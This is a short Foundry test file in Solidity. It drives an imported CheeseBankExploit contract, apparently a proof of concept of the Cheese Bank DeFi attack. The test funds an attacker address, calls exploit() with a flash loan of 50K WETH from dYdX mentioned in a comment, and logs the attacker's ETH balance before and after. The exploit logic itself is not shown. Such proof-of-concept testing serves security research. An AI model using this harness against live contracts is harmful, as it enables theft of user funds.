// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../exploit/CheeseBankExploit.sol";

contract TestCheeseBank is Test {
    CheeseBankExploit exploiter;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 200 ether);
    }

    function testCheeseBankExploit() public {
        vm.startPrank(attacker);

        exploiter = new CheeseBankExploit();
        payable(address(exploiter)).call{value: 100 ether}("");

        console.log("Attacker ETH before:", attacker.balance / 1e18);

        // Flash loan 50K WETH from dYdX
        exploiter.exploit(50000 ether);

        console.log("Attacker ETH after:", attacker.balance / 1e18);

        vm.stopPrank();
    }
}
